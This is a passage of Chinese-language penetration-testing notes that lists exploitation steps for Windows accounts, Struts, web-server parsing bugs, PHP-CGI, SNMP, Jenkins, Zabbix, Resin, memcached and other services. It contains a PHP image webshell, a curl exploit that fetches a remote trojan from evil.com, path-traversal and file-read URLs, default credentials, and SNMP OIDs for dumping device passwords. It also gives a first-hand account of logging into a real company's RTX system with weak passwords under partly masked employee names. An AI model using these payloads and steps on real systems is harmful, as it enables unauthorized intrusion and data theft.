+<p><code class="highlighter-rouge">net user Guest xiuyou!</code></p>
+
+<p><img src="\assets\img\安全运维\file_html_6ea978c38fc505e6.png" alt="" /></p>
+
+<p><code class="highlighter-rouge">net localgroup administrators</code></p>
+
+<p><img src="\assets\img\安全运维\file_html_eae0acb1c41ca212.png" alt="" /></p>
+
+<p><code class="highlighter-rouge">net localgroup administrators Guest /add</code></p>
+
+<p><img src="\assets\img\安全运维\file_html_60b78b69da695ec6.png" alt="" /></p>
+
+<p><img src="\assets\img\安全运维\file_html_30d1210394b8be38.png" alt="" /></p>
+
+<p>mstsc打开远程终端，<code class="highlighter-rouge">Guest / xiuyou!</code></p>
+
+<p><img src="\assets\img\安全运维\file_html_f8671774fb643b0f.png" alt="" /></p>
+
+<p>激活Guest用户 <code class="highlighter-rouge">net user Guest /active:yes</code></p>
+
+<p><img src="\assets\img\安全运维\file_html_880a526fcaa8650a.png" alt="" /></p>
+
+<p><img src="\assets\img\安全运维\file_html_25d3715c70e27e3d.png" alt="" /></p>
+
+<p><img src="\assets\img\安全运维\file_html_790c103cd138a9e2.png" alt="" /></p>
+
+<h1 id="5-struts漏洞">5 struts漏洞</h1>
+
+<p>drops.wooyun.org/papers/902</p>
+
+<p>sebug.net/appdir/Apache+Struts</p>
+
+<p>Struts是Apache软件基金会Jakarta项目组的一个开源项目，它采用MVC模式，帮助java开发者利用J2EE开发Web应用，可以用来构件复杂的Web应用。它允许我们分解一个应用程序的商业逻辑、控制逻辑和表现逻辑的代码，使它的重用性和维护性更好。</p>
+
+<h2 id="51-s2-016命令执行漏洞">5.1 S2-016命令执行漏洞</h2>
+
+<p>在struts2中，DefaultActionMapper类支持以”action:”、”redirect:”、”redirectAction:”作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令。redirect:和redirectAction:此两项前缀为Struts默认开启功能，目前Struts
+2.3.15.1以下版本均存在此漏洞。</p>
+
+<h2 id="52-s2-017重定向漏洞">5.2 S2-017重定向漏洞</h2>
+
+<p>Apache Struts
+2.0.0没有有效过滤”redirect:”/”redirectAction:”参数前缀内容，存在多个开放重定向漏洞，攻击者通过构建特制的URI并诱使用户点击，利用这些漏洞将这些用户重定向到攻击者控制的站点，执行钓鱼攻击。</p>
+
+<h2 id="53-s2-019命令执行漏洞">5.3 S2-019命令执行漏洞</h2>
+
+<p>Struts2 是第二代基于Model-View-Controller
+(MVC)模型的java企业级web应用框架。Apache
+Struts 2.3.15.2之前版本的“Dynamic Method
+Invocation”机制是默认开启的，仅提醒用户如果可能的情况下关闭此机制，这样就存在远程代码执行漏洞，远程攻击者可利用此漏洞在受影响应用上下文中执行任意代码。</p>
+
+<h1 id="6-web服务器解析漏洞">6 web服务器解析漏洞</h1>
+
+<p>www.cnseay.com/806/</p>
+
+<h2 id="61-iis-60">6.1 IIS 6.0</h2>
+
+<ul>
+  <li>
+    <p>后缀解析： /xx.asp;.jpg</p>
+  </li>
+  <li>
+    <p>目录解析： /xx.asp/xx.jpg
+（xx.asp目录下可解析任何文件）</p>
+  </li>
+  <li>
+    <p>默认解析： xx.asa xx.cer xx.cdx
+（IIS默认配置中，该类文件由asp.dll解析）</p>
+  </li>
+  <li>
+    <p>发散思维： /xx.asa/xx.jpg /xx.cer/xx.jpg /xx.cdx/xx.jpg</p>
+  </li>
+</ul>
+
+<h2 id="62-iis-70iis-75nginx0837">6.2 IIS 7.0/IIS 7.5/Nginx&lt;=0.8.37</h2>
+
+<p>默认Fast-CGI开启状况下，在文件路径（/xx.jpg）后加上/xx.php，即/xx.jpg/xx.php会被解析为php文件。</p>
+
+<p>xx.jpg为一句话图片马，制作过程如下：</p>
+
+<p><code class="highlighter-rouge">copy yy.jpg/b + zz.txt/a xx.jpg</code></p>
+
+<p>/b：二进制模式</p>
+
+<p>/a：ASCII模式</p>
+
+<p>yy.jpg ：正常图片文件</p>
+
+<p>zz.txt ：一句话 &lt;?PHP
+fputs(fopen(‘shell.php’,’w’),’&lt;?PHP
+eval($_POST\youxiu)?&gt;’);?&gt;</p>
+
+<p>shell.php youxiu</p>
+
+<h2 id="63-nginx0837">6.3 Nginx&lt;=0.8.37</h2>
+
+<p>在Fast-CGI关闭的情况下，Nginx仍然存在解析漏洞：</p>
+
+<p>在文件路劲(xx.jpg)后面加上%00.php ，即
+xx.jpg%00.php
+会被当做php文件来解析</p>
+
+<p>参照《Nginx空字节可远程执行代码漏洞》</p>
+
+<h2 id="64-apache">6.4 Apache</h2>
+
+<ul>
+  <li>后缀解析： test.php.x1.x2.x3
+（x1,x2,x3为没有在mime.types文件中定义的文件类型）</li>
+</ul>
+
+<p>Apache将从右往左开始判断后缀，若x3为非可识别后缀，则判断x2，直到找到可识别后缀为止，然后对可识别后缀进行解析。</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>Apache可解析： php</td>
+      <td>php3</td>
+      <td>phtml</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>参照《Apache漏洞之后缀名解析漏洞》</p>
+
+<p>防范：在apache配置文件中添加禁止.php文件执行的语句：</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>&lt;Files ~ ”.(php.</td>
+      <td>php3.</td>
+      <td>phtml.)”&gt;</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Order Allow,Deny</p>
+
+<p>Deny from all</p>
+
+<p>&lt;/Files&gt;</p>
+
+<ul>
+  <li>若在Apache中，
+.htaccess可被应用（即
+AllowOverride=All）</li>
+</ul>
+
+<p>.htaccess可被上传</p>
+
+<p>则在.htaccess中写入
+(shell.jpg为上传文件，便可得到shell)</p>
+
+<p>&lt;FilesMatch “shell.jpg”&gt; SetHandler application/x-httpd-php
+&lt;/FilesMatch&gt;</p>
+
+<h2 id="65-lighttpd">6.5 lighttpd</h2>
+
+<p>xx.jpg/xx.php</p>
+
+<h2 id="66-windows环境">6.6 windows环境</h2>
+
+<p>Windows环境下，文件 xx.jpg[空格]</p>
+
+<p>文件 xx.jpg.</p>
+
+<p>两类文件不允许存在。若这样命名，windows会自动除去空格和点，从而被利用。</p>
+
+<h1 id="7-php-cgi远程任意代码执行漏洞">7 PHP-CGI远程任意代码执行漏洞</h1>
+
+<p>zone.wooyun.org/content/151</p>
+
+<p>www.hackbase.com/tech/2012-05-07/66395.html</p>
+
+<p>该漏洞是用户将HTTP请求参数提交至Apache服务器，通过mod_cgi模块交给后端的php-cgi处理，但在执行过程中部分字符没有得到处理，比如空格、等号（=）、减号（-）等。利用这些字符，攻击者可以向后端的php-cgi解析程序提交恶意数据，php-cgi会将这段“数据”当做php参数直接执行，目前截获到的攻击主要利用以下PHP参数：</p>
+
+<p><img src="\assets\img\安全运维\file_html_7505e63d7f39ad25.png" alt="" /></p>
+
+<h2 id="71-本地包含执行代码">7.1 本地包含执行代码</h2>
+
+<p>curl -H “USER-AGENT: &lt;?system(‘id’);die();?&gt;”</p>
+
+<p>http://target.com/test.php?-dauto_prepend_file%3d/proc/self/environ+-n </p>
+
+<p>（/proc/self/environ 为本地文件路径）</p>
+
+<h2 id="72-远程包含执行代码">7.2 远程包含执行代码</h2>
+
+<p>Curl
+http://target.com/test.php?-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp%3a%2f%2Fwww.evil.com%2fevil.txt </p>
+
+<p>（%3d = %3a : %2f / ）</p>
+
+<p>（http://www.evail.com/evil.txt为木马文件）</p>
+
+<h1 id="8-fck编辑器上传漏洞">8 FCK编辑器上传漏洞</h1>
+
+<h2 id="81-漏洞利用">8.1 漏洞利用</h2>
+
+<ul>
+  <li>
+    <p>编辑器本身存在漏洞：更多参见《后台编辑器漏洞手册》</p>
+  </li>
+  <li>
+    <p>编辑器 + web服务器解析漏洞</p>
+  </li>
+  <li>
+    <p>突破后台建立文件夹漏洞（. 变
+_）</p>
+  </li>
+</ul>
+
+<h1 id="9-apache-server-status对外暴露">9 Apache Server Status对外暴露</h1>
+
+<p>www.ccvita.com/333.html</p>
+
+<p>Apache 1.3.2及之后的版本自带查看Apache状态的功能模块
+server-status，若设置不严（对公网开放），就会造成信息泄露，例如：真实IP、性能信息、客户端IP、旁站信息等。</p>
+
+<h2 id="91-利用方式">9.1 利用方式</h2>
+
+<p>未做限制访问的URL为：http://www.apache.org/server-status</p>
+
+<h1 id="10-网站备份文件可下载">10 网站备份文件可下载</h1>
+
+<p>该问题可能导致源代码泄露，获取web.conf文件，从中得到数据库密码，导致进一步渗透。</p>
+
+<h2 id="101-利用方式">10.1 利用方式</h2>
+
+<p>常见备份目录为：</p>
+
+<p>http://www.xxx.com/xxx.rar</p>
+
+<p>http://www.xxx.com/xxx.zip</p>
+
+<p>http://aaa.xxx.com/aaa.rar</p>
+
+<p>http://bbb.xxx.com.cn/bbb.tar</p>
+
+<p>http://bbb.xxx.com/sysadmin.tar.gz</p>
+
+<p>ip/www.xxx.com.zip</p>
+
+<ul>
+  <li>
+    <p>直接在URL中访问，然后下载</p>
+  </li>
+  <li>
+    <p>使用curl工具 例如： curl -I
+http://www.fff.com/fff.zip</p>
+  </li>
+</ul>
+
+<p>（curl是利用URL语法在命令行下工作的开原文件传输工具）</p>
+
+<h1 id="11-目录遍历并查看敏感数据">11 目录遍历并查看敏感数据</h1>
+
+<p>这类漏洞的危害可大可小，一般都是结合具体环境来利用。</p>
+
+<h2 id="111-利用方式">11.1 利用方式</h2>
+
+<p>根据从wooyun上看到的漏洞，其发现方式主要有:</p>
+
+<ul>
+  <li>
+    <p>wvs扫描目录 (inc，
+返回312，直接访问看到目录列表)</p>
+  </li>
+  <li>
+    <p>常见泄露路径：</p>
+  </li>
+</ul>
+
+<p>http://www.xxx.com/caches</p>
+
+<p>http://www.xxx.com/database</p>
+
+<p>http://www.xxx.com/..%2f..%2f..%2f..%2fetc%2fpasswd</p>
+
+<h1 id="12-snmp信息泄露">12 SNMP信息泄露</h1>
+
+<p>drops.wooyun.org/tips/409</p>
+
+<h2 id="121-基本原理">12.1 基本原理</h2>
+
+<p>SNMP（简单网络管理协议）：该协议能够支持网络管理系统，用以监测连接到网络上的设备是否有任何引起管理上关注的情况。目前共有V1、V2、V3三个版本，应用比较广泛的还是前两个版本，同时存在安全问题也较多。</p>
+
+<p>Cacti、Mrtg等监控工具都基于snmp协议。其原理可以简单理解为：</p>
+
+<p>管理主机向被管理的主机或设备发送一个请求（包含community和oid）</p>
+
+<p>（community相当于认证口令）</p>
+
+<p>（oid为代号，例如112代表CPU使用率，113代表内存使用率）</p>
+
+<p>被管理设备收到请求后先查看community是否与自己保持的一致，若一致则返回请求</p>
+
+<p>信息，若不一致则不返回任何信息。</p>
+
+<p>此外，管理主机通过snmp协议除了可以获取被管理主机的信息外，还可以修改其配置</p>
+
+<p>信息（主要是路由交换设备方面）。</p>
+
+<h2 id="122-snmp弱口令">12.2 snmp弱口令</h2>
+
+<p>snmp服务器的默认密码为public，漏洞发现与扫描：</p>
+
+<ul>
+  <li>
+    <p>x-scan扫描 + GFI LANGard利用</p>
+  </li>
+  <li>
+    <p>使用Snmp Digger进行漏洞利用</p>
+  </li>
+  <li>
+    <p>snmputil.exe</p>
+  </li>
+</ul>
+
+<table>
+  <tbody>
+    <tr>
+      <td>snmputil.exe get</td>
+      <td>getnext</td>
+      <td>walk agent community oid[oid……]</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>当前进程列表 snmputil.exe walk ip public
+.1.3.6.1.2.1.25.4.2.1.2</p>
+
+<p>系统用户列表 snmputil.exe walk ip public
+.1.3.6.1.4.1.77.1.2.25.1.1</p>
+
+<p>列 出 域 名 snmputil.exe walk ip public
+.1.3.6.1.4.1.77.1.4.1.0</p>
+
+<p>列出安装软件 snmputil.exe walk ip public
+.1.3.6.1.2.1.25.6.3.1.2</p>
+
+<p>列出系统信息 snmputil.exe walk ip public .1.3.6.1.2.1.1</p>
+
+<ul>
+  <li>IP Network
+Browser（snmp浏览工具）</li>
+</ul>
+
+<h2 id="123-snmp获取管理员密码">12.3 snmp获取管理员密码</h2>
+
+<p>snmp默认开放端口: 161</p>
+
+<ul>
+  <li>H3C防火墙：通过SNMP只读权限的团体字符串便可以读到管理密码，从而控制设备。（WooYun-2013-21877(http://www.wooyun.org/bugs/wooyun-2013-021877)）</li>
+</ul>
+
+<p>扫描工具：
+solarwinds中的snmpsweep</p>
+
+<p>升级版：solarwinds工具包中的 ip browser</p>
+
+<ul>
+  <li>华为quidway三层交换</li>
+</ul>
+
+<p>利用这个OID读出的密码为明文（WooYun-2013-21964(http://www.wooyun.org/bugs/wooyun-2013-021964)）</p>
+
+<p>root@bt:~# snmpwalk -c private -v 1 x.x.x.x
+1.3.6.1.4.1.2011.5.2.1.10.1</p>
+
+<p>对于存在该漏洞的设备，目前已知可以获取帐号的oid有一下三个（walk）:</p>
+
+<p>1.3.6.1.4.1.2011.5.2.1.10.1</p>
+
+<p>1.3.6.1.4.1.2011.10.2.12.1.1.1</p>
+
+<p>1.3.6.1.4.1.25506.2.12.1.1.1</p>
+
+<h2 id="124-实战演练">12.4 实战演练</h2>
+
+<p><code class="highlighter-rouge">snmpwalk -v 2c -c public xx.xx.xx.xx</code></p>
+
+<p><img src="\assets\img\安全运维\file_html_41e07a3a71e3e362.png" alt="" /></p>
+
+<h1 id="13-svn源码泄露">13 SVN源码泄露</h1>
+
+<p>drops.wooyun.org/tips/352(http://drops.wooyun.org/tips/352)</p>
+
+<h2 id="131-svn介绍">13.1 SVN介绍</h2>
+
+<p>Subversion，简称SVN，是一个开放源代码的版本控制系统。在开源软件的开发过程中，由于开发方式自由和开发人员分散等特性，版本控制问题一直关系到项目成败，没有版本控制开源软件的开发过程就会变得混乱和不可控制。</p>
+
+<p>Subversion使用服务端—客户端的结构（当然服务端与客户端可以都运行在同一台服务器上）。在服务端是存放着所有受控制数据的Subversion仓库，另一端是Subversion的客户端程序，管理着受控数据的一部分在本地的映射（称为“工作副本”）。两端间通过各种仓库存取层（Repository
+Access，简称RA）的多条通道（通道中可以通过不同的网络协议比如HTTP、SSH或本地文件等）进行访问的。</p>
+
+<p>svn默认端口是3690</p>
+
+<h2 id="132-漏洞原理">13.2 漏洞原理</h2>
+
+<p>程序导出方式：</p>
+
+<p>在现实开发环境中，建议使用导出功能svn
+export（而不是svn co）</p>
+
+<p>svn co ：【导出结果带 .svn
+文件夹的目录树】</p>
+
+<p>svn co http://路径[本地目录全路径]
+–username 用户名 –password 密码</p>
+
+<p>svn co svn://路径[本地目录全路径]
+–username 用户名 –password 密码</p>
+
+<p>svn export ：【导出结果不带 .svn
+文件夹的目录树】</p>
+
+<p>svn export [-r版本号]
+http://路径[本地目录全路径] –username
+用户名 –password 密码</p>
+
+<p>svn export [-r版本号]
+svn://路径[本地目录全路径] –username
+用户名 –password 密码</p>
+
+<p>漏洞产生原因：</p>
+
+<p>在实际开发环境中，很管理员直接把svn
+co导出来的代码放到web目录下，致使 .svn
+隐藏文件夹暴露于外网环境中，恶意攻击者可以借助其中包含的用于版本信息追踪的“entries”文件逐步摸清站点结构。</p>
+
+<p>漏洞利用方式：</p>
+
+<p>若 .svn目录没有做访问权限限制，可以通过
+.svn 来遍历文件和目录列表。</p>
+
+<p>若
+*.php.svn-base被当做php来执行，若暴露php错误信息(真实路径)或空白内容，则该站点存在扩展名问题，找文件上传处上传xx.php.gif文件获取webshell。</p>
+
+<p>若
+*.php.svn-base不当做php文件执行，则可下载svn中的所有php源码文件。</p>
+
+<ul>
+  <li>
+    <p>直接在浏览器中访问 /.svn/entries</p>
+  </li>
+  <li>
+    <p>利用seay的svn工具</p>
+  </li>
+</ul>
+
+<h1 id="14-hadhoop应用对外访问">14 hadhoop应用对外访问</h1>
+
+<h2 id="141-基础概念">14.1 基础概念</h2>
+
+<p>Hadoop是一个由apache基金会所开发的分布式系统基础架构。用户可以在不了解分布式底层细节的情况下，开发分布式程序。充分利用集群的威力进行高速运算和存储。</p>
+
+<h2 id="142-漏洞利用">14.2 漏洞利用</h2>
+
+<p>默认开放端口：</p>
+
+<p>hadoop 50070</p>
+
+<p>hbase 50075</p>
+
+<p>hdfs 50090</p>
+
+<ul>
+  <li>
+    <p>Hadoop管理界面弱口令，例如：admin 123456
+WooYun-2014-58320(http://www.wooyun.org/bugs/wooyun-2014-058320)</p>
+  </li>
+  <li>
+    <p>Hadoop远程命令执行，通过hadoop，hbase，hdfs0.2
+RC版本的管理web端能远程执行命令（jstack
+pstack
+servlet执行命令），通过该节点对集群服务器进行任务分发（该项是基本功能，可以进行批量提权linux主机），从而渗透进hadoop集群。
+WooYun-2013-20282(http://www.wooyun.org/bugs/wooyun-2013-020282)</p>
+  </li>
+</ul>
+
+<h1 id="15-nagios信息泄露">15 Nagios信息泄露</h1>
+
+<p>Nagios是一个监视系统运行状态和网络信息的监视系统。Nagios能监视所指定的本地或远程主机及服务，可运行在linux、unix平台上，同时提供一个基于浏览器的WEB界面以方便系统管理人员查看网络状态，各种系统问题以及日志等等。</p>
+
+<h2 id="151-漏洞利用">15.1 漏洞利用</h2>
+
+<p>Nagios运维监控API接口暴露
+WooYun-2014-86842(http://wooyun.org/bugs/wooyun-2014-086842)</p>
+
+<h1 id="16-rtx即时通信信息泄露">16 RTX即时通信信息泄露</h1>
+
+<p>腾讯通RTX(Real Time
+eXchange)是腾讯公司推出的企业级即时通信平台。企业员工可以轻松地通过服务器配置的组织架构查找需要进行通信的人员，并采用丰富的沟通方式进行实时沟通。文本消息、文本传输、直接语音会话或者视频的形式满足不同办公环境下的沟通需求。</p>
+
+<h2 id="161-漏洞利用">16.1 漏洞利用</h2>
+
+<p>默认开放端口： 8012</p>
+
+<ul>
+  <li>开放应用端口暴露：
+http://xx.xx.xx.xx:8012/userlist.php</li>
+</ul>
+
+<p>直接可以访问到所有用户id、用户名等信息的json</p>
+
+<p>在“查看审核结果处”尝试用户名+弱口令(3102
+或123456)登陆，登陆成功后即进入内部网络。</p>
+
+<ul>
+  <li>得到用户名后，可以读取手机号</li>
+</ul>
+
+<p>用户名： rtx.bxlq.com/userlist.php</p>
+
+<p>手机号：
+rtx.bxlq.com/getmobile.cgi?receiver=用户名</p>
+
+<h2 id="162-动手实践">16.2 动手实践</h2>
+
+<p><a href="http://xx.xx.xx.xx:8012/userlist.php">http://xx.xx.xx.xx:8012/userlist.php</a> 中国某公司</p>
+
+<p><img src="\assets\img\安全运维\file_html_e1c2ee9745806f6d.png" alt="" /></p>
+
+<p>回到首页，查看审核结果处，进行弱口令尝试：高X军
+/ 123456</p>
+
+<p><img src="\assets\img\安全运维\file_html_7d72e064c94b344c.png" alt="" /></p>
+
+<p>回到首页，下载并安装客户端进行登陆</p>
+
+<p><img src="\assets\img\安全运维\file_html_7624c1251b81f7c6.png" alt="" /></p>
+
+<p><img src="\assets\img\安全运维\file_html_da7cf1ecb96eb2d.png" alt="" /></p>
+
+<p>一直连接不上，最后用nmap扫描端口，一个个尝试，最终确定为9002</p>
+
+<p>高X军 123456</p>
+
+<p>桂X林 123456</p>
+
+<p>孔X月 123456</p>
+
+<p><img src="\assets\img\安全运维\file_html_9c42e03c9ee49942.png" alt="" /></p>
+
+<p>公司领导</p>
+
+<p><img src="\assets\img\安全运维\file_html_4baa431beadedd58.png" alt="" /></p>
+
+<h1 id="17-ganglia系统监控信息泄露">17 Ganglia系统监控信息泄露</h1>
+
+<p>Ganglia是UC
+Berkeley发起的一个开源集群监视项目，设计用于测量数以千计的节点。Ganglia的核心包含gmond、gmetad以及一个web前段。主要用来监控系统性能，如cpu、mem、硬盘利用率、I/O负载、网络流量情况等，通过曲线很容易见到每个节点的工作状态，对合理调整、分配系统资源，提高系统整体性能起到重要作用。</p>
+
+<p>工作原理：</p>
+
+<p>Ganglia包括如下几个程序，他们之间通过XDR(xml的压缩格式)或者XML格式传递监控数据，达到监控效果。集群内的节点，通过运行gmond收集发布节点状态信息，然后gmetad周期性的轮询gmond收集到的信息，然后存入rrd数据库，通过web服务器可以对其进行查询展示。</p>
+
+<h2 id="171-漏洞利用">17.1 漏洞利用</h2>
+
+<p>可以查看公司内部流量信息、被监控主机的配置信息及运行状态。</p>
+
+<p>开放端口：8649
+（不确定，案例中还有开放8000）</p>
+
+<ul>
+  <li>
+    <p>直接在浏览器地址栏输入IP:8649 eg:
+http://xx.xx.xxx.xx:8649/</p>
+  </li>
+  <li>
+    <p>直接访问域名：ganglia.xx.com</p>
+  </li>
+  <li>
+    <p>使用nc查看： nc.exe iii.com
+8649 |more</p>
+  </li>
+</ul>
+
+<h1 id="18-j2ee应用架构web服务器搭配不当">18 j2ee应用架构（web服务器搭配不当）</h1>
+
+<p>drops.wooyun.org/papers/60</p>
+
+<p>在通常的web应用中会将多个web服务器搭配着使用，以解决其中某台服务器的性能缺陷、负载均衡及完成一些分层结构的安全策略等。较常见的如：Nginx+Tomcat的分层结构</p>
+
+<p>Nginx：高性能的HTTP和反向代理服务器。通过它可以解决一些静态资源(图片、js、css等类型的文件)访问处理。</p>
+
+<p>Tomcat：免费开放源代码的j2ee
+Web服务器。其性能缺陷：处理静态资源特别是图片文件时特别吃力。</p>
+
+<h2 id="181-漏洞成因">18.1 漏洞成因</h2>
+
+<p>由于处理方式或分层架构设计，如果对静态资源的目录或文件的映射配置不当，就会引发安全问题(特别是在j2ee应用中)。</p>
+
+<p>Tomcat的WEB-INF目录(每个j2ee的web应用部署文件默认包含该目录)，在tomcat中该目录禁止访问，包含以下内容：</p>
+
+<p>classes目录：包含该应用核心的java类编译后的class文件及部分配置文件；</p>
+
+<p>lib目录：所有框架、插件和组件的架包；</p>
+
+<p>web.xml目录：重要配置文件。(展开攻击的一把钥匙)</p>
+
+<p>Nginx在解析静态文件时，把web-inf目录映射进去，若没有做nginx相关安全配置或由于nginx自身缺陷影响，将导致通过nginx访问到tomcat的web-inf目录。</p>
+
+<p>通常，只配置nginx把与j2ee及开发架或自定义框架有关的url(例如：.jsp
+、.do、.action…等)交给tomcat，剩下的大部分后缀类型的url直接交给nginx处理(包括web-inf中比较重要的.xml、class等类型)。</p>
+
+<h2 id="182-漏洞利用">18.2 漏洞利用</h2>
+
+<p>该问题普遍存在于大型站点应用中，由于j2ee应用自身的一些特性，例如：起点配置文件web.xml（/WEB-IINF/web.xml），若先找到它并结合j2ee的xml路径配置特点，就可以找到其他的配置文件(需进行反编译)，甚至获得整个应用的所有核心代码及应用架构的相关信息。</p>
+
+<h2 id="183-修复方案">18.3 修复方案</h2>
+
+<ul>
+  <li>
+    <p>最好不要映射非静态文件目录或敏感目录；</p>
+  </li>
+  <li>
+    <p>修改nginx配置文件，禁止访问WEB-INF文件
+:<code class="highlighter-rouge">Location ~ ^/WEB-INF/* {deny all;}</code></p>
+  </li>
+</ul>
+
+<h1 id="19-jenkins平台未设置登录验证">19 Jenkins平台未设置登录验证</h1>
+
+<p>Jenkins是基于java开发的一种持续集成工具，用于监控持续重复的工作，功能包括：(1)持续的软件版本发布/测试项目；(2)监控外部调用执行的工作。</p>
+
+<h2 id="191-漏洞利用">19.1 漏洞利用</h2>
+
+<ul>
+  <li>未授权访问，可直接执行命令 wooyun-2013-028803</li>
+</ul>
+
+<p>直接在url中访问： eg:
+http://xx.xx.xx.xx:8080(http://xx.xx.xx.xx:8080/)
+(端口视具体情况而定，案例中有3000、8888)</p>
+
+<ul>
+  <li><a href="http://ip/script">http://ip/script</a></li>
+</ul>
+
+<p>java.lang.Runtime.getRuntime().exec(‘id’).getText();
+行脚本并回显一句话</p>
+
+<h1 id="20-zabbix默认口令">20 zabbix默认口令</h1>
+
+<h2 id="201-基础知识">20.1 基础知识</h2>
+
+<p>Zabbix除了监控功能强大之处，还可以在忘记root密码的时候重置服务器root密码。（这也是一个超级后门）</p>
+
+<p>此外，system.run模块可以执行任意指令（agent在root权限下，不过一般都开启该权限）</p>
+
+<h2 id="202-利用方式">20.2 利用方式</h2>
+
+<p>弱口令进入后台： http://ip/zabbix/ admin / zabbix</p>
+
+<p>攻击方法：</p>
+
+<ul>
+  <li>
+    <p>尝试system.run执行命令</p>
+  </li>
+  <li>
+    <p>获取zabbix server shell：</p>
+  </li>
+</ul>
+
+<p>Administrator——&gt;Scripts——&gt;修改Commands(例如改为
+uname -a)</p>
+
+<p>Monitoring——&gt;Last data——&gt;点击Zabbix
+server，执行调用命令</p>
+
+<h1 id="21-zenoss默认口令">21 zenoss默认口令</h1>
+
+<h2 id="211-基本知识">21.1 基本知识</h2>
+
+<p>Zenoss
+Core是开源企业级IT管理软件-智能监控软件，允许IT管理员依靠单一的WEB控制台来监控网络架构的状态和健康度。Zenoss同时也是开源的网络与系统管理软件。</p>
+
+<h2 id="212-漏洞利用">21.2 漏洞利用</h2>
+
+<p>ip:8080 admin / zenoss</p>
+
+<p>ip:8080/zport/dmd/Dashboard</p>
+
+<p>zenoss有一个commands功能，可以执行指令将指令修改为自己需要的即可），然后选中一台机器执行指令。</p>
+
+<p>在wooyun上所见到的案例中，最令人头疼的也最难理解的是：</p>
+
+<ul>
+  <li>
+    <p>wooyun-2013-019917 反弹获取shell</p>
+  </li>
+  <li>
+    <p>wooyun-2013-019917
+边界神器py版开启socks代理</p>
+  </li>
+</ul>
+
+<p>（zone.wooyun.org/content/1693）</p>
+
+<ul>
+  <li>wooyun-2013-019917
+端口转发（将代理端口转发到公网）</li>
+</ul>
+
+<h1 id="22-resin任意文件读取">22 Resin任意文件读取</h1>
+
+<h2 id="221-基本知识">22.1 基本知识</h2>
+
+<p>Resin：java应用服务器</p>
+
+<p>CAUCHO公司产品，是一个非常流行的application server
+，对server和JSP提供良好的支持，速度非常快直逼APACHE
+SERVER。Resin支持负载均衡，可以增加web站点的可靠性。</p>
+
+<h2 id="222-漏洞利用">22.2 漏洞利用</h2>
+
+<p>Resin的某个CGI程序实现上存在输入验证漏洞，远程攻击者可能利用此漏洞读取Web主目录下的任意文件。</p>
+
+<ul>
+  <li>任意文件读取：</li>
+</ul>
+
+<p>配置文件：</p>
+
+<p>http://ip/resin-doc/examples/ico-periodictask/viewfile?file=WEB-INF/web.xml</p>
+
+<p>读取源码：</p>
+
+<p>http://ip/resin-doc/examples/ico-periodictask/viewfile?file=index.xtp</p>
+
+<p>读取password.xml</p>
+
+<p>ip/resin-doc/examples/ioc-periodictask/viewfile?file=WEB-INF/password.xml</p>
+
+<ul>
+  <li>resin文件包含漏洞shell (wooyun-2013-023139)</li>
+</ul>
+
+<p>http://ip/Resin-doc/viewfile/?contextpath=C:\&amp;servletpath=&amp;file=boot.ini</p>
+
+<ul>
+  <li>resin弱口令</li>
+</ul>
+
+<p>http://ip/resin-admin/status.php admin / admin</p>
+
+<ul>
+  <li>resin版本过低，导致磁盘信息泄露</li>
+</ul>
+
+<p><a href="http://ip/c:/">http://ip/c:/</a></p>
+
+<h2 id="223-实例演练">22.3 实例演练</h2>
+
+<p>http://www.xx.cn/c:/ （wooyun-2013-041338）</p>
+
+<p><img src="\assets\img\安全运维\file_html_c53a22d32c38834b.png" alt="" /></p>
+
+<p><img src="\assets\img\安全运维\file_html_6a5593fbd445e703.png" alt="" /></p>
+
+<h1 id="23-memcache未限制访问ip">23 memcache未限制访问IP</h1>
+
+<h2 id="231-基础知识">23.1 基础知识</h2>
+
+<p>Memcached是一个高性能的分布式内存对象缓存系统，用于动态web应用以减轻数据库负载。它通过内存缓存数据和对象来减少读取数据库的次数，从而提高动态、数据库驱动网站的速度。Memcached基于一个存储键/值对的hashmap。其守护进程是用C写的，但是客户端可以用任何语言来编写，并通过memcached协议与守护进程通信。</p>
+
+<h2 id="232-漏洞利用">23.2 漏洞利用</h2>
+
+<p>Memcached未限制IP导致cache泄露
+服务默认端口：11211</p>
+
+<ul>
+  <li>使用nc 反弹查看数据：</li>
+</ul>
+
+<p>nc.exe –vv ip 11211</p>
+
+<p>ip: inverse host lookup failed: h_errno 11004: NO_DATA</p>
+
+<p>(UNKNOWN) [ip] 11211 (?) open</p>
+
+<p>stats items</p>
+
+<p>STAT items:4:number 1544729</p>
+
+<p>…….</p>
+
+<ul>
+  <li>
+    <p>memcached空口令访问 可以直接telnet登陆
+wooyun-2010-0123604</p>
+  </li>
+  <li>
+    <p>root@kali:~# nc ip 11211</p>
+  </li>
+</ul>
+
+<h2 id="233-实战演练">23.3 实战演练</h2>
+
+<p>root@Aerfa:~# nc -vv xx.xx.xx.xx 11211</p>
+
+<p><img src="\assets\img\安全运维\file_html_ba1df478b9b7aee9.png" alt="" /></p>
+
+<p>root@Aerfa:~# nc -vv yy.yy.yy.yy 11211</p>
+
+<p><img src="\assets\img\安全运维\file_html_df926128a0be01ea.png" alt="" /></p>
+
+<h1 id="24-jboss配置不当">24 Jboss配置不当</h1>
+
+<p>drops.wooyun.org/papers/178</p>
+
+<h2 id="241-基本信息">24.1 基本信息</h2>
+
+<p>Jboss基于J2EE的开放源代码的应用服务器（JAVA应用服务器），是一个管理EJB的容器和服务器（Jboss企业中间件JEMS的一部分），其核心服务不包括service/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
+
+<p>Jboss应用服务框架：</p>
+
+<ul>
+  <li>Java管理扩展（JMX）：监控管理java应用程序的标准化架构，分为三层：</li>
+</ul>
+
+<p><img src="\assets\img\安全运维\file_html_7ca4d6381121d244.png" alt="" /></p>
+
+<p>设备层（instrumentation）：定义信息模型。</p>
+
+<p>代理层（Agent）：定义各种服务以及通信模型，所有的管理构件都需要向他注册。</p>
+
+<p>分布服务层（distribute）：定义能对代理层进行操作的管理接口和构件。</p>
+
+<ul>
+  <li>JMX
+Invoker：允许客户端应用程序发送任意协议的JMX请求到服务端</li>
+</ul>
+
+<p>这些请求都是用MBean服务器发送到响应的Mbean服务</p>
+
+<ul>
+  <li>Deployer架构：</li>
+</ul>
+
+<p>JAR（Java
